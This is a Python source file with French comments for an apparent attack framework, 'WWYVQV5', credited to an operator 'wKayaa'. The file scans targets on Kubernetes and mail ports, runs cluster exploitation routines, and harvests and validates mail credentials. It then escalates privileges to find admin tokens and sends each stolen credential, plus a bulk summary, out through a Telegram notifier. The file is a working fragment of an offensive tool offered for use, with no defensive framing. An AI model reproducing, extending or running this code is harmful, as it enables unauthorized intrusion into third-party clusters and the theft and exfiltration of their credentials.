#!/usr/bin/env python3
"""
WWYVQV5 - Orchestrateur Principal avec Mail Services Integration
"""

import asyncio
from datetime import datetime
from typing import Dict, List

class WWYVQv5MailOrchestrator:
    """Orchestrateur principal avec intégration mail services"""
    
    def __init__(self, base_framework):
        self.base_framework = base_framework
        self.mail_hunter = MailServicesHunter()
        self.privilege_escalator = KubernetesMailPrivilegeEscalation(base_framework)
        self.telegram_notifier = TelegramMailNotifier()
        
        # Stats étendues
        self.mail_stats = {
            "mail_credentials_found": 0,
            "mail_credentials_validated": 0,
            "mail_services_compromised": 0,
            "test_emails_sent": 0,
            "privilege_escalations_via_mail": 0
        }
    
    async def run_enhanced_exploitation(self, targets: List[str]):
        """Exploitation améliorée avec focus mail services"""
        self.base_framework.logger.info("🚀 WWYVQV5 Enhanced Mail Exploitation Started")
        
        session_results = {
            "clusters_exploited": [],
            "mail_credentials_harvested": [],
            "privilege_escalations": [],
            "telegram_alerts_sent": 0
        }
        
        async with aiohttp.ClientSession() as session:
            # Expansion des cibles
            expanded_targets = self.base_framework.expand_targets(targets)
            
            # Exploitation parallèle avec focus mail
            tasks = []
            semaphore = asyncio.Semaphore(self.base_framework.config.max_concurrent_clusters)
            
            for target in expanded_targets:
                task = self._exploit_target_with_mail_focus(session, target, semaphore)
                tasks.append(task)
            
            # Exécution des tâches
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Consolidation des résultats
            for result in results:
                if isinstance(result, dict) and not isinstance(result, Exception):
                    if result.get('cluster_compromised'):
                        session_results["clusters_exploited"].append(result)
                    if result.get('mail_credentials'):
                        session_results["mail_credentials_harvested"].extend(result['mail_credentials'])
                    if result.get('privilege_escalation'):
                        session_results["privilege_escalations"].append(result['privilege_escalation'])
        
        # Envoi résumé final Telegram
        await self._send_session_summary(session_results)
        
        return session_results
    
    async def _exploit_target_with_mail_focus(self, session: aiohttp.ClientSession, 
                                            target: str, semaphore: asyncio.Semaphore):
        """Exploitation d'une cible avec focus mail services"""
        async with semaphore:
            try:
                ports = [6443, 8443, 10250, 8080, 443, 80, 25, 587, 465]  # Ajout ports mail
                
                for port in ports:
                    for protocol in ['https', 'http']:
                        try:
                            base_url = f"{protocol}://{target}:{port}"
                            
                            # Test d'accessibilité
                            async with session.get(base_url, ssl=False, timeout=5) as response:
                                if response.status in [200, 401, 403]:
                                    self.base_framework.logger.info(f"🎯 Cluster détecté: {base_url}")
                                    
                                    # Exploitation normale + mail focus
                                    result = await self._deep_exploit_with_mail(session, base_url)
                                    
                                    if result['success']:
                                        return result
                                        
                        except:
                            continue
                            
                return {"success": False, "target": target}
                
            except Exception as e:
                return {"success": False, "target": target, "error": str(e)}
    
    async def _deep_exploit_with_mail(self, session: aiohttp.ClientSession, 
                                    base_url: str) -> Dict:
        """Exploitation approfondie avec focus mail"""
        result = {
            "success": False,
            "cluster_compromised": False,
            "mail_credentials": [],
            "privilege_escalation": None,
            "base_url": base_url
        }
        
        try:
            # Phase 1: Exploitation Kubernetes standard
            cluster_info = await self.base_framework.exploit_cluster(session, base_url.split('://')[-1], base_url)
            
            if cluster_info:
                result["cluster_compromised"] = True
                
                # Phase 2: Hunt mail credentials spécifique
                mail_creds = await self.mail_hunter.hunt_mail_credentials(session, base_url)
                if mail_creds:
                    self.mail_stats["mail_credentials_found"] += len(mail_creds)
                    
                    # Validation des credentials
                    validated_creds = await self.mail_hunter.validate_credentials(mail_creds)
                    self.mail_stats["mail_credentials_validated"] += len(validated_creds)
                    
                    result["mail_credentials"] = validated_creds
                    
                    # Notification Telegram pour chaque credential validé
                    for cred in validated_creds:
                        await self.telegram_notifier.send_mail_credential_alert(cred, cluster_info)
                
                # Phase 3: Escalade de privilèges via mail services
                escalation_result = await self.privilege_escalator.escalate_via_mail_services(
                    session, cluster_info, base_url
                )
                
                if escalation_result['admin_tokens_found']:
                    self.mail_stats["privilege_escalations_via_mail"] += 1
                    result["privilege_escalation"] = escalation_result
                
                result["success"] = True
                
        except Exception as e:
            self.base_framework.logger.error(f"❌ Erreur exploitation mail {base_url}: {str(e)}")
        
        return result
    
    async def _send_session_summary(self, session_results: Dict):
        """Envoi du résumé de session via Telegram"""
        summary_message = f"""📊 WWYVQV5 SESSION COMPLETE

🎯 RÉSULTATS:
├── Clusters exploités: {len(session_results['clusters_exploited'])}
├── Mail credentials: {len(session_results['mail_credentials_harvested'])}
├── Escalades privilèges: {len(session_results['privilege_escalations'])}
└── Alerts envoyées: {session_results.get('telegram_alerts_sent', 0)}

📧 MAIL SERVICES:
├── Credentials trouvés: {self.mail_stats['mail_credentials_found']}
├── Credentials validés: {self.mail_stats['mail_credentials_validated']}
├── Services compromis: {self.mail_stats['mail_services_compromised']}
└── Escalades via mail: {self.mail_stats['privilege_escalations_via_mail']}

🕐 Session: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
👤 Operator: wKayaa
🚀 Framework: WWYVQV5 Enhanced v5.1
"""
        
        await self.telegram_notifier.send_bulk_credentials_summary(
            session_results['mail_credentials_harvested']
        )
        
        print("📊 Session terminée - Résumé envoyé via Telegram")